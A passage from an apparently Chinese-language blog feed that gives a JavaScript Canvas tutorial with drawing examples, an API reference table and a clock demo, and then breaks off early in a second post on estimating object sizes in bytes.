class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#canvas</span> &#123;</span></span><br><span class="line">        height: 100vh;</span><br><span class="line">        width: 100vw;</span><br><span class="line">        border: 1px solid red;</span><br><span class="line"><span class="css">        <span class="comment">/* display: block; */</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;canvas&gt;</code> 标签只有两个属性<strong>——</strong> <code>width</code>和<code>height</code>，可以使用 JS 设置canvas 宽高，这里不能直接给 canvas 设置 <code>height: 100vh;</code> <code>width: 100vw;</code> </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">&quot;canvas&quot;</span>);</span><br><span class="line">canvas.width = <span class="built_in">document</span>.documentElement.clientWidth;</span><br><span class="line">canvas.height = <span class="built_in">document</span>.documentElement.clientHeight;</span><br></pre></td></tr></table></figure><ul><li>canvas画圆</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> painting = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> ctx = canvas.getContext(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">ctx.fillStyle = <span class="string">&quot;black&quot;</span>;</span><br><span class="line">ctx.strokeStyle = <span class="string">&quot;none&quot;</span>;</span><br><span class="line"></span><br><span class="line">canvas.onmousedown = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    painting = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">canvas.onmousemove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (painting === <span class="literal">true</span>) &#123;</span><br><span class="line">        ctx.beginPath();</span><br><span class="line">        ctx.arc(e.clientX, e.clientY, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI);</span><br><span class="line">        ctx.stroke();</span><br><span class="line">        ctx.fill()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">canvas.onmouseup = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    painting = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><h3 id="颜色、样式和阴影"><a href="#颜色、样式和阴影" class="headerlink" title="颜色、样式和阴影"></a>颜色、样式和阴影</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_fillstyle.asp">fillStyle</a></td><td>设置或返回用于填充绘画的颜色、渐变或模式</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_strokestyle.asp">strokeStyle</a></td><td>设置或返回用于笔触的颜色、渐变或模式</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_shadowcolor.asp">shadowColor</a></td><td>设置或返回用于阴影的颜色</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_shadowblur.asp">shadowBlur</a></td><td>设置或返回用于阴影的模糊级别</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_shadowoffsetx.asp">shadowOffsetX</a></td><td>设置或返回阴影距形状的水平距离</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_shadowoffsety.asp">shadowOffsetY</a></td><td>设置或返回阴影距形状的垂直距离</td></tr></tbody></table><h3 id="线条样式"><a href="#线条样式" class="headerlink" title="线条样式"></a>线条样式</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_linecap.asp">lineCap</a></td><td>设置或返回线条的结束端点样式</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_linejoin.asp">lineJoin</a></td><td>设置或返回两条线相交时，所创建的拐角类型</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_linewidth.asp">lineWidth</a></td><td>设置或返回当前的线条宽度</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_miterlimit.asp">miterLimit</a></td><td>设置或返回最大斜接长度</td></tr></tbody></table><h3 id="矩形"><a href="#矩形" class="headerlink" title="矩形"></a>矩形</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_rect.asp">rect()</a></td><td>创建矩形</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_fillrect.asp">fillRect()</a></td><td>绘制“被填充”的矩形</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_strokerect.asp">strokeRect()</a></td><td>绘制矩形（无填充）</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_clearrect.asp">clearRect()</a></td><td>在给定的矩形内清除指定的像素</td></tr></tbody></table><h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_fill.asp">fill()</a></td><td>填充当前绘图（路径）</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_stroke.asp">stroke()</a></td><td>绘制已定义的路径</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_beginpath.asp">beginPath()</a></td><td>起始一条路径，或重置当前路径</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_moveto.asp">moveTo()</a></td><td>把路径移动到画布中的指定点，不创建线条</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_closepath.asp">closePath()</a></td><td>创建从当前点回到起始点的路径</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_lineto.asp">lineTo()</a></td><td>添加一个新点，然后在画布中创建从该点到最后指定点的线条</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_clip.asp">clip()</a></td><td>从原始画布剪切任意形状和尺寸的区域</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_quadraticcurveto.asp">quadraticCurveTo()</a></td><td>创建二次贝塞尔曲线</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_beziercurveto.asp">bezierCurveTo()</a></td><td>创建三次方贝塞尔曲线</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_arc.asp">arc()</a></td><td>创建弧/曲线（用于创建圆形或部分圆）</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_arcto.asp">arcTo()</a></td><td>创建两切线之间的弧/曲线</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_ispointinpath.asp">isPointInPath()</a></td><td>如果指定的点位于当前路径中，则返回 true，否则返回 false</td></tr></tbody></table><h3 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_scale.asp">scale()</a></td><td>缩放当前绘图至更大或更小</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_rotate.asp">rotate()</a></td><td>旋转当前绘图</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_translate.asp">translate()</a></td><td>重新映射画布上的 (0,0) 位置</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_transform.asp">transform()</a></td><td>替换绘图的当前转换矩阵</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_settransform.asp">setTransform()</a></td><td>将当前转换重置为单位矩阵。然后运行 transform()</td></tr></tbody></table><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_font.asp">font</a></td><td>设置或返回文本内容的当前字体属性</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_textalign.asp">textAlign</a></td><td>设置或返回文本内容的当前对齐方式</td></tr><tr><td><a href="https://www.w3school.com.cn/tags/canvas_textbaseline.asp">textBaseline</a></td><td>设置或返回在绘制文本时使用的当前文本基线</td></tr></tbody></table><h3 id="图像绘制"><a href="#图像绘制" class="headerlink" title="图像绘制"></a>图像绘制</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/tags/canvas_drawimage.asp">drawImage()</a></td><td>向画布上绘制图像、画布或视频</td></tr></tbody></table><h3 id="像素操作"><a href="#像素操作" class="headerlink" title="像素操作"></a>像素操作</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>width</td><td>返回 ImageData 对象的宽度</td></tr><tr><td>height</td><td>返回 ImageData 对象的高度</td></tr><tr><td>data</td><td>返回一个对象，其包含指定的 ImageData 对象的图像数据</td></tr></tbody></table><h2 id="Canvas练习"><a href="#Canvas练习" class="headerlink" title="Canvas练习"></a>Canvas练习</h2><h3 id="绘制圆形和文本"><a href="#绘制圆形和文本" class="headerlink" title="绘制圆形和文本"></a>绘制圆形和文本</h3><ul><li>绘制线段</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath();</span><br><span class="line"><span class="comment">// 设置绘制的起始点</span></span><br><span class="line">ctx.moveTo(<span class="number">50</span>, <span class="number">50</span>);</span><br><span class="line"><span class="comment">// 设置经过某个位置</span></span><br><span class="line">ctx.lineTo(<span class="number">50</span>, <span class="number">300</span>);</span><br><span class="line">ctx.lineTo(<span class="number">300</span>, <span class="number">100</span>);</span><br><span class="line"><span class="comment">// 设置绘制的结束点</span></span><br><span class="line">ctx.closePath();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 起始路径的线段边缘设置为圆角</span></span><br><span class="line">ctx.lineCap = <span class="string">&quot;round&quot;</span>;</span><br><span class="line"><span class="comment">// 转折处的线段设置为圆角</span></span><br><span class="line">ctx.lineJoin = <span class="string">&quot;round&quot;</span></span><br><span class="line"><span class="comment">// 设置颜色样式</span></span><br><span class="line">ctx.strokeStyle = <span class="string">&quot;aqua&quot;</span>;</span><br><span class="line">ctx.lineWidth = <span class="number">20</span>;</span><br><span class="line">ctx.stroke()</span><br></pre></td></tr></table></figure><ul><li>绘制圆</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认为false，顺时针，true逆时针</span></span><br><span class="line"><span class="comment">// ctx,arc(x, y, radius, startAngle, endAngle, anticlockwise)</span></span><br><span class="line">ctx.arc(<span class="number">300</span>, <span class="number">300</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI, <span class="literal">true</span>);</span><br><span class="line">ctx.fillStyle = <span class="string">&quot;bisque&quot;</span>;</span><br><span class="line">ctx.fill();</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><ul><li>弹幕字体</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctx.font = <span class="string">&quot;50px sans-serif&quot;</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1200</span>;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1200</span>, <span class="number">1200</span>);</span><br><span class="line">    x -= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        x = <span class="number">1200</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.fillText(<span class="string">&quot;hello&quot;</span>, x, <span class="number">100</span>);</span><br><span class="line">    ctx.strokeText(<span class="string">&quot;world&quot;</span>, x, <span class="number">200</span>);</span><br><span class="line">&#125;, <span class="number">40</span>)</span><br></pre></td></tr></table></figure><h3 id="绘制图形"><a href="#绘制图形" class="headerlink" title="绘制图形"></a>绘制图形</h3><ul><li>绘制图像（同一图片）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">&quot;./imgs/2.jpg&quot;</span>;</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    ctx.drawImage(img, <span class="number">50</span>, <span class="number">100</span>, <span class="number">480</span>, <span class="number">270</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> img2 = <span class="keyword">new</span> Image();</span><br><span class="line">img2.src = <span class="string">&quot;./imgs/3.jpg&quot;</span>;</span><br><span class="line">img2.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    ctx.drawImage(img2, <span class="number">400</span>, <span class="number">400</span>, <span class="number">480</span>, <span class="number">270</span>, <span class="number">100</span>, <span class="number">400</span>, <span class="number">480</span>, <span class="number">270</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>绘制图像（视频抽帧）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> video = <span class="built_in">document</span>.querySelector(<span class="string">&quot;video&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> interval = <span class="literal">null</span>;</span><br><span class="line">video.onplay = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    interval = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        ctx.drawImage(video, <span class="number">0</span>, <span class="number">800</span>, <span class="number">800</span>, <span class="number">400</span>)</span><br><span class="line">    &#125;, <span class="number">32</span>)</span><br><span class="line">&#125;</span><br><span class="line">video.onpause = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绘制时钟"><a href="#绘制时钟" class="headerlink" title="绘制时钟"></a>绘制时钟</h2><p>ES6版本参考这个（附带效果）：<a href="https://github.com/llwodexue/clock">https://github.com/llwodexue/clock</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> canvas1 = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#canvas1&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> ctx = canvas1.getContext(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">ctx.save();</span><br><span class="line">ctx.translate(<span class="number">400</span>, <span class="number">300</span>);</span><br><span class="line">ctx.rotate(-<span class="built_in">Math</span>.PI / <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 绘制表盘</span></span><br><span class="line">ctx.beginPath();</span><br><span class="line">ctx.arc(<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI);</span><br><span class="line">ctx.strokeStyle = <span class="string">&quot;darkgrey&quot;</span>;</span><br><span class="line">ctx.lineWidth = <span class="number">10</span>;</span><br><span class="line">ctx.stroke();</span><br><span class="line">ctx.closePath();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">renderClock</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.translate(<span class="number">400</span>, <span class="number">300</span>);</span><br><span class="line">    ctx.rotate(-<span class="built_in">Math</span>.PI / <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 绘制表盘</span></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.arc(<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI);</span><br><span class="line">    ctx.strokeStyle = <span class="string">&quot;darkgrey&quot;</span>;</span><br><span class="line">    ctx.lineWidth = <span class="number">10</span>;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">drawLine</span>(<span class="params">&#123; count, start, end, width, color &#125;</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; count; i++) &#123;</span><br><span class="line">            ctx.beginPath();</span><br><span class="line">            ctx.rotate((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / count);</span><br><span class="line">            ctx.moveTo(start, <span class="number">0</span>);</span><br><span class="line">            ctx.lineTo(end, <span class="number">0</span>);</span><br><span class="line">            ctx.lineWidth = width;</span><br><span class="line">            ctx.strokeStyle = color;</span><br><span class="line">            ctx.stroke();</span><br><span class="line">            ctx.closePath();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 绘制分针刻度线</span></span><br><span class="line">    drawLine(&#123;</span><br><span class="line">        count: <span class="number">60</span>,</span><br><span class="line">        start: <span class="number">180</span>,</span><br><span class="line">        end: <span class="number">190</span>,</span><br><span class="line">        width: <span class="number">2</span>,</span><br><span class="line">        color: <span class="string">&quot;orangered&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 绘制时针刻度线</span></span><br><span class="line">    drawLine(&#123;</span><br><span class="line">        count: <span class="number">12</span>,</span><br><span class="line">        start: <span class="number">180</span>,</span><br><span class="line">        end: <span class="number">200</span>,</span><br><span class="line">        width: <span class="number">10</span>,</span><br><span class="line">        color: <span class="string">&quot;darkgrey&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">let</span> min = time.getMinutes();</span><br><span class="line">    <span class="keyword">let</span> sec = time.getSeconds();</span><br><span class="line">    <span class="keyword">let</span> hour = time.getHours();</span><br><span class="line">    hour = hour &gt; <span class="number">12</span> ? hour - <span class="number">12</span> : hour;</span><br><span class="line">    <span class="comment">// 绘制秒针</span></span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.rotate(((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / <span class="number">60</span>) * sec);</span><br><span class="line">    ctx.moveTo(-<span class="number">30</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.lineTo(<span class="number">170</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.lineWidth = <span class="number">2</span>;</span><br><span class="line">    ctx.strokeStyle = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">    ctx.restore();</span><br><span class="line">    <span class="comment">// 绘制分针</span></span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.rotate(((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / <span class="number">60</span>) * min + ((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / <span class="number">3600</span>) * sec);</span><br><span class="line">    ctx.moveTo(-<span class="number">20</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.lineTo(<span class="number">150</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.lineWidth = <span class="number">4</span>;</span><br><span class="line">    ctx.strokeStyle = <span class="string">&quot;darkblue&quot;</span>;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">    ctx.restore();</span><br><span class="line">    <span class="comment">// 绘制时针</span></span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.rotate(</span><br><span class="line">        ((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / <span class="number">12</span>) * hour +</span><br><span class="line">            ((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / <span class="number">12</span> / <span class="number">60</span>) * min +</span><br><span class="line">            ((<span class="number">2</span> * <span class="built_in">Math</span>.PI) / <span class="number">12</span> / <span class="number">60</span> / <span class="number">60</span>) * sec</span><br><span class="line">    );</span><br><span class="line">    ctx.moveTo(-<span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.lineTo(<span class="number">130</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.lineWidth = <span class="number">6</span>;</span><br><span class="line">    ctx.strokeStyle = <span class="string">&quot;darkgrey&quot;</span>;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">    ctx.restore();</span><br><span class="line">    <span class="comment">// 绘制表圈</span></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.arc(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI);</span><br><span class="line">    ctx.fillStyle = <span class="string">&quot;deepskyblue&quot;</span>;</span><br><span class="line">    ctx.fill();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">    ctx.restore();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    renderClock();</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h2 id="Canvas-绘图板"><a href="#Canvas-绘图板" class="headerlink" title="Canvas 绘图板"></a>Canvas 绘图板</h2><p>绘图板参考（附带效果）： <a href="https://github.com/llwodexue/canvas_painting">https://github.com/llwodexue/canvas_painting</a></p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E7%BB%98%E5%9B%BE%E6%9D%BF.gif"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/266b4fa2c446">Fira Code | 为写程序而生的字体</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial">Canvas教程</a></p><p><a href="https://stackoverflow.com/questions/3974827/detecting-touch-screen-devices-with-javascript">Detecting touch screen devices with Javascript</a></p><p><a href="https://www.w3school.com.cn/tags/html_ref_canvas.asp">HTML 5 Canvas 参考手册</a></p>]]></content>
    
    
    <summary type="html">Canvas画圆、时钟、绘图板</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="Canvas" scheme="http://llmysnow.top/tags/Canvas/"/>
    
  </entry>
  
  <entry>
    <title>JS 实现 sizeOf 函数，计算 object 占用了多少个 bytes</title>
    <link href="http://llmysnow.top/posts/9cad4e3f/"/>
    <id>http://llmysnow.top/posts/9cad4e3f/</id>
    <published>2021-05-23T05:43:10.501Z</published>
    <updated>2021-05-26T01:29:13.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes"><a href="#实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes" class="headerlink" title="实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes"></a>实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes</h2><p>可以参考：<a href="https://github.com/miktam/sizeof">https://github.com/miktam/sizeof</a></p><ul><li>Number：一个数字 8 字节（64 位存储）</li><li>String：一个字符 2 字节</li><li>Boolean：4 个字节</li></ul><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> same = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> testData = &#123;</span><br><span class="line">  a: <span class="number">111</span>,</span><br><span class="line">  